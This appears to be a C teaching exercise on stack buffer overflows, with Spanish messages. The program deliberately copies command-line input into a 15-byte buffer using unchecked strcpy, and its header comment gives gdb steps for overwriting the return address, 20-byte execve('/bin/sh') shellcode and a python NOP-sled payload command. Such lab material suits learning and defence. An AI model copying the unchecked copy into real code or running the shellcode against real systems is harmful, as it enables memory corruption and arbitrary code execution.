#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
*
* Memory experiments
* 
*
* References:
* https://www.geeksforgeeks.org/c/memory-layout-of-c-program/
* https://users.cs.jmu.edu/bernstdh/web/common/lectures/summary_vulnerabilities_c_buffer-overflows.php
*
*
* Usage: make memory_checks && ./memory_checks 1234567
*
* make debug
* list show program code
* disas main show main function assembly code
* run 123456781234567812345678 - segfaults
* run 123456781234567811111111 - segfaults
* run 1234567812345678111111111 - overwrites return address
* run 1234567812345678111111118 - overwrites return address to 0x...38
* (0x38 is ASCII for character '8') Return address (rip) is being rewritten
* Check with info registers
* shellcode: 20 bytes
* unsigned char buf[] = 
"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
"\x69\x6e\x89\xe3\xcd\x80"
*
* run $(python -c 'print ("\x90" * 9 + "\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x51")')
* x /200 $rsp - 75
*
* x /200xw $rsp - 50
*
*/


int main(int argc, char *argv[]) {
    int num = 1936;
    char buf[15]; 

    if (argc <= 1) {
        printf("Usage: %s <attack string>\n", argv[0]);
        exit(1);
    }

    printf("Direccion en memoria del buffer: %p\n", buf);
    printf("Direccion en memoria del numero: %p\n\n", &num);

    printf("Direccion del buffer: %lu\n", (unsigned long)buf);
    printf("Direccion del numero: %lu\n\n", (unsigned long)&num);

    printf("Bytes a almacenar en el buffer: %d\n", strlen(argv[1])+1);
    printf("Bytes de distancia en memoria: %lu\n\n", (unsigned long)&num-(unsigned long)buf);

    if(strlen(argv[1]) < (unsigned long)&num-(unsigned long)buf){
        printf("El buffer no se desbordara.\n\n");
    } else {
        printf("El buffer se desbordara.\n\n");
    }

    printf("Valor antes de almacenar en el buffer: %d\n\n", num);

    printf("Contenido a almacenar en el buffer: %s\n", argv[1]);
    printf("Intentando desbordar el buffer...\n");
    strcpy(buf, argv[1]);
    printf("Contenido del buffer: %s\n\n", buf);
    
    printf("Valor despues de almacenar en el buffer: %d\n", num);
    

    return 0;
}
